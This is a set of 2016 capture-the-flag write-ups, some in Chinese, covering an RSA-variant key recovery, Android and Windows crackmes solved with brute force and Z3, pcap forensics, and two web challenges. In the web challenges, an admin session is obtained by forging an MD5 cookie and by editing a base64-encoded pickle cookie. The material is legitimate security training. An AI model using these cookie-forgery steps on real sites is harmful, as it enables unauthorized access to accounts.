+### File: ctf-writeups/2016/bctf/crypto/special_rsa/README.md
+
+## special_rsa (crypto, 200p)
+
+
+While studying and learning RSA, I knew a new form of encryption/decryption with the same safety as RSA.
+I encrypted msg.txt and got msg.enc as an example for you.
+```shell
+$ python special_rsa.py enc msg.txt msg.enc
+```
+Can you recover flag.txt from flag.enc?  
+[special_rsa.zip.f6e85b8922b0016d64b1d006529819de](./special_rsa.zip.f6e85b8922b0016d64b1d006529819de)
+
+---------------------------------------
+
+### step 1
+Analyzing the `special_rsa.py` src code, we know the key is `k` or `k_inv`. If we know the one of them, problem is solved.
+```python
+def decrypt(c, k):
+    out = ''
+    for r_s, c_s in msgpack.unpackb(c):
+        r = int(r_s.encode('hex'), 16)
+        c = int(c_s.encode('hex'), 16)
+        k_inv = modinv(k, N)
+        out += pad_even(format(pow(k_inv, r, N) * c % N, 'x')).decode('hex')
+    return out
+```  
+
+Now we get the formula `pow(k_inv, r, N) * c = m (mod N)`, and `r`, `N`, `c`, `m` are known.
+we can do some change:
+```python
+pow(k_inv, r, N) * c = m (mod N)
+pow(k_inv, r, N) * c * c_inv = m * c_inv (mod N)  # c_inv is c's Multiplicative inverse modulo (乘法逆元) 
+c * c_inv = 1 (mod N)
+pow(k_inv, r, N) = m * c_inv (mod N)
+```
+
+we can do a test like below: 
+```python
+c = inf2[0][1]
+m = inf1[0]
+c_inv = modinv(c, N)  
+t = (m * c_inv) % N 
+print (t*c)%N == m  # print true
+```
+
+### step 2
+from the `msg.enc`, we can know there are two `r`, and we have: 
+```python
+k_inv^r1 = t1 (mod N)  # t1 = (m * c1_inv) % N
+k_inv^r2 = t2 (mod N)  # t2 = (m * c2_inv) % N
+```
+
+do some change: 
+```python
+k_inv^(r0+r2) = t1 (mod N)  # set r1>r2 and r0+r2==r1
+k_inv^r0 * k_inv^r2 = t1 (mod N)
+# calc the Multiplicative inverse modulo (乘法逆元) of k_inv^r2
+tmp = modinv(k_inv^r2, N) 
+k_inv^r0 * k_inv^r2 * tmp = t1 * tmp (mod N)
+k_inv^r0 = t1 * tmp (mod N)  # because tmp * k_inv^r2 = 1 (mod N)
+```
+
+So we get a smaller `r`. we found `r1` and `r2` are coprime, check as below：
+```python
+import gmpy
+print gmpy.gcd(inf2[0][0], inf2[1][0]) == 1
+```
+
+so we can get the `k_inv` quickly by Euclidean algorithm (辗转相除法). like below,
+```python
+def my_gcd(t1, r1, t2, r2): 
+    assert r1 > r2   
+    r = 1     
+    while r:
+        r = r1 % r2
+        a = r1 / r2       
+        r1 = r2         
+        r2 = r
+        t2_inv = modinv(t2, N)
+        t = t2 
+        t2 = (t1*pow(t2_inv, a, N)) % N
+        t1 = t 
+    # print t1, r1 
+    # print t2, r2 
+    assert r1 == 1
+    return t1
+    
+t1, r1 = lst[0]
+t2, r2 = lst[1]
+if r1 >= r2:
+    k_inv = my_gcd(t1, r1, t2, r2)
+else:
+    k_inv = my_gcd(t2, r2, t1, r1)
+```
+
+Great! we get the `k_inv`. See all the code in [special_rsa_ans.py](./special_rsa_ans.py)
+
+
+### File: ctf-writeups/2016/bctf/reverse/LostFlower/README.md
+
+## LostFlower (reverse, 250p)
+
+[LostFlower.apk.fd2bbce976cb355919c8209b69a56a52](./LostFlower.apk.fd2bbce976cb355919c8209b69a56a52)
+
+---------------------------------------
+
+### 思路
+这是一个apk程序，安装后发现要输入正确的数字才可以获得flag。用`jeb`查看java代码，很简单的逻辑，获取一个数字，之后通过JNI判断是否正确。  
+so代码混淆了，IDA f5出来的代码不是很正确。混淆方式是采用多重循环加条件判断来混淆了程序的流程。查看了函数列表，发现 check1/check2/check3/check4 这四个函数。由于程序流程被混淆了，所以还是用动态调试来确认下运行顺序。IDA远程调试apk，借助idapython脚本下断点，慢慢调试。  
+整个程序的逻辑还是很简单的：
+```
+1. 输入的密码 a 为10位长 （注意虽然可以输入更长，但不作用，因为int的范围为[-2147483648, 2147483647]）
+2. 把a每个位上的数字查表转换, 累加求和为b
+3. 如果`abs(a-b)`小于零，那么密码就是正确的，之后根据密码生成flag
+```
+
+关键就在于 `abs(a-b) < 0` 为何会成立？想了好久才知道，如果 `a-b = -2147483648`, 那么取反后由于溢出，还是负的。  
+取值范围不是很大，采用爆破方式查找符合要求的数字。代码请看[LostFlower_ans.py](./LostFlower_ans.py)
+
+### 后记
+最近接触到`z3`库后，发现解决这类问题很方便，所以用z3也写个脚本[z3_ans.py](./z3_ans.py),速度比较之前的写法快了10倍多，很满意。
+
+
+
+### File: ctf-writeups/2016/google_ctf/Forensics/In Recorded Conversation/README.md
+
+##题目描述
+---
+
+题目给的一个`tcpdump capture file`:
+
+[irc.pcap](./irc.pcap)
+
+
+##题解
+---
+
+用wireshark打开,follow stream,可以看到最后有人发了分段的消息出来，拼接出来就是Flag
+
+如图:
+
+![irc.png](./irc.png)
+
+
+
+### File: ctf-writeups/2016/google_ctf/Forensics/No Big Deal/README.md
+
+##题目描述
+---
+
+题目给的一个`tcpdump capture file`:
+
+[no-big-deal.pcap](./no-big-deal.pcap)
+
+
+##题解
+---
+当我翻墙下载下来这个big file的时候，看了一下大小.
+
+```
+➜  Desktop  ls -lh no-big-deal.pcap
+-rw-r--r--@ 1 shellvon  staff    96M  4 30 19:27 no-big-deal.pcap
+```
+第一想法是好大哦，我第一次遇见这么大的文件，要不strings看看(strings估计也很多，我们看一下长的吧)..
+
+然后
+
+```bash
+strings no-big-deal.pcap | grep -E "[a-zA-Z0-9_]{15,}"
+```
+
+
+我看到有许多是属于rb结尾的ruby文件和mod文件和最后重复出现了4次的`Q1RGe2JldHRlcmZzLnRoYW4ueW91cnN9`。当时我脑子抽，完全没想到这是base64编码。。。
+
+T_T...
+
+
+
+### File: ctf-writeups/2016/google_ctf/README.md
+
+#Google Capture The Flag 2016
+
++ Team: Thanos
++ Rank: 214
++ Score: 440
+
+
+
+### File: ctf-writeups/2016/google_ctf/Web/Ernst Echidna/README.md
+
+##题目描述
+---
+
+Can you hack [this](https://ernst-echidna.ctfcompetition.com/) website? The robots.txt sure looks interesting.
+
+
+##题解
+
+先看robots.txt(个人习惯..),发现有admin.提示权限不足。
+注册发现admin账户已经存在，尝试注册了一个账户叫admin2，发现多了cookie
+'md5-hash=c84258e9c39059a89ab77d846ddab909'
+
+如图:
+
+![regitser.png](./register.png)
+
+cookie是用户名admin2的md5 hash结果,遂使用document.cookie='md5-hash=21232f297a57a5a743894a0e4a801fc3', 设置新的cookie,访问admin,得到flag
+
+> Congratulations, your token is 'CTF{renaming-a-bunch-of-levels-sure-is-annoying}'
+
+
+
+### File: ctf-writeups/2016/google_ctf/Web/Spotted Quoll/README.md
+
+##题目描述
+---
+
+[This](https://ssl-added-and-removed-here.ctfcompetition.com:9447) blog on Zombie research looks like it might be interesting - can you break into the /admin section?
+
+
+##题解
+
+此题和[Ernst Echidna](../Ernst Echidna)类似。进去发现`Cookie`:
+
+> "obsoletePickle=KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu"
+
+使用python解base64 (Javascript也可以用atob/btoa)
+```python
+In [1]: a.decode('base64')
+Out[2]: "(dp1\nS'python'\np2\nS'pickles'\np3\nsS'subtle'\np4\nS'hint'\np5\nsS'user'\np6\nNs."
+```
+
+发现着来自python pickles包，
+
+```python
+In [2]: import pickle
+
+In [3]: a = a.decode('base64')
+
+In [4]: pickle.loads(a)
+Out[4]: {'python': 'pickles', 'subtle': 'hint', 'user': None}
+```
+
+此处user为none,对应网站上说`err=user_not_found`就有依据了，尝试修改user为admin:
+
+```
+In [5]: t = pickle.loads(a)
+
+In [6]: t['user'] = 'admin'
+
+In [7]: pickle.dumps(t)
+Out[7]: "(dp0\nS'python'\np1\nS'pickles'\np2\nsS'subtle'\np3\nS'hint'\np4\nsS'user'\np5\nS'admin'\np6\ns."
+In [8]: import base64
+
+In [9]: base64.b64encode(pickle.dumps(t))
+KGRwMApTJ3B5dGhvbicKcDEKUydwaWNrbGVzJwpwMgpzUydzdWJ0bGUnCnAzClMnaGludCcKcDQKc1MndXNlcicKcDUKUydhZG1pbicKcDYKcy4=
+```
+
+得Flag
+> Your flag is CTF{but_wait,theres_more.if_you_call} ... but is there more(1)? or less(1)?
+
+
+###坑
+
+我习惯了用python自带的encode/deocde方法，发现在直接调用a.encode('base64')的时候换行符会忽略，然后导致base64是错误的（我开始用了urlencode之类的方式都无果）后来移除了`\n`搞定。
+
+
+
+
+
+
+
+
+
+
+
+### File: ctf-writeups/2016/whctf/re200/README.md
+
+## Crackme_6 (reverse, 200p)
+
+我讨厌数学
+分值：200分 
+数学没学好，你能帮我解出这道题么？
+
+[Crackme_6](./Crackme_6.exe)
+
+---------------------------------------
+
+### 思路
+这题逆向方面很简单，放到IDA里一看就明白逻辑了，如下：
+``` c
+int main()
+{
+  int v1; // [sp+14h] [bp-Ch]@1
+  signed int k; // [sp+18h] [bp-8h]@9
+  signed int i; // [sp+1Ch] [bp-4h]@1
+  signed int j; // [sp+1Ch] [bp-4h]@8
+
+  __main();
+  v1 = 0;
+  gets(flag);
+  for ( i = 0; i <= 35; ++i )
+  {
+    if ( !flag[i] )
+    {
+      flag[i] = 1;
+      ++v1;
+    }
+  }
+  if ( v1 != 9 )                                // flag长度为27
+    exit(0);
+  convert(a);                                   // 转换为6*6的矩阵a
+  Transposition(a);                             // a矩阵翻转为矩阵b
+  Multi(a, b);                                  // 矩阵a*b = c
+  for ( j = 0; j <= 5; ++j )
+  {
+    for ( k = 0; k <= 5; ++k )
+    {
+      if ( c[0][k + 6 * j] != d[0][k + 6 * j] )
+        exit(0);
+    }
+  }
+  printf("congratulations!you have gottern the flag!");
+  return 0;
+}
+```
+输入的flag长度为27，加上9个1，形成一个6*6的矩阵a。矩阵翻转90度为矩阵b。矩阵a乘以矩阵b得到目标矩阵。如果正常来做就是解多元方程式，比较复杂。但我们借助`Z3库`,可以很方便解出来，详细请看[ans.py](./ans.py)
+
+
+### 总结
+1. 条件约束问题利用Z3库来解决十分快捷方便
+2. `BitVec`的位数对计算过程的中间量有影响，一开始都是char类型的，设置为8个bit，结果答案不对，因为这样算出来的答案是以8个bit的大小为限制得到的。所以最后设置为32个bit。虽然花费的时间长一点（位数大，花费的时间多），但保证答案正确。
+
+
+
+### File: ctf-writeups/README.md
+
+###Thanos Writeup
+
+
